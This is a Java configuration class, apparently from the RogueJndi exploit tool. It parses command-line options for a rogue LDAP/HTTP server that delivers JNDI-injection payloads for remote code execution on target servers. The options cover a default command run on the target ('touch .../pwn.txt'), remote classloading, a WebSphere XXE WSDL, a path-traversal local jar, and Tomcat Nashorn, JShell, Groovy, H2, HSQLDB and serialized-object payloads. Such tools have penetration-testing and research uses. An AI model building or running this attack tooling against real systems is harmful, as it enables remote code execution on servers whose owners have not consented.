package artsploit;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;

import java.net.InetAddress;
import java.net.UnknownHostException;

public class Config {

    @Parameter(names = {"-c", "--command"}, description = "Command to execute on the target server", order = 0)
    public static String command = "touch /usr/local/tomcat/temp/pwn.txt";

    @Parameter(names = {"-n", "--hostname"}, description = "Local HTTP server hostname " +
            "(required for remote classloading and websphere payloads)", order = 1)
    public static String hostname;

    static {
        try { //try to get the local hostname by default
            hostname = InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            hostname = "127.0.0.1";
        }
    }

    @Parameter(names = {"-l", "--ldapPort"}, description = "Ldap bind port", order = 2)
    public static int ldapPort = 1389;

    @Parameter(names = {"-p", "--httpPort"}, description = "Http bind port", order = 3)
    public static int httpPort = 8000;

    @Parameter(names = {"--wsdl"}, description = "[websphere1 payload option] WSDL file with XXE payload", order = 4)
    public static String wsdl = "/list.wsdl";

    @Parameter(names = {"--localjar"}, description = "[websphere2 payload option] Local jar file to load " +
                    "(this file should be located on the remote server)", order = 5)
    public static String localjar = "../../../../../tmp/jar_cache7808167489549525095.tmp";

    @Parameter(names = {"--h2"}, description = "[H2 database init script file", order = 6)
    public static String h2 = "/h2";

    @Parameter(names = {"--js-payload-path"}, description = "[Tomcat Nashorn payload option] Path to a .js file containing the payload served by the Tomcat controllers; overwrites the -c option", order = 7)
    public static String jsPayloadPath = "";

    @Parameter(names = {"--jshell-payload-path"}, description = "[Tomcat JShell payload option] Path to a .java file containing the payload served by the Tomcat controllers; overwrites the -c option", order = 8)
    public static String jshellPayloadPath = "";

    @Parameter(names = {"--groovy-payload-path"}, description = "[Groovy payload option] Path to a .groovy file containing the payload served by the Groovy controller, overwrites the -c option", order = 9)
    public static String groovyPayloadPath= "";

    @Parameter(names = {"--generic-payload-path"}, description = "[Generic controller option] Path to a file containing a serialized object served by the Generic controller, overwrites the -c option", order = 10)
    public static String genericPayloadPath = "";

    @Parameter(names = {"--jdbc-url"}, description = "[HSQLDB controller option] JDBC URL pointing to an HSQL database", order = 11)
    public static String jdbcURL= "";

    @Parameter(names = {"-h", "--help"}, help = true, description = "Show this help")
    private static boolean help = false;

    public static void applyCmdArgs(String[] args) {
        //process cmd args
        JCommander jc = JCommander.newBuilder()
                .addObject(new Config())
                .build();
        jc.parse(args);
        jc.setProgramName("java -jar target/RogueJndi-1.0.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if(help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }
    }
}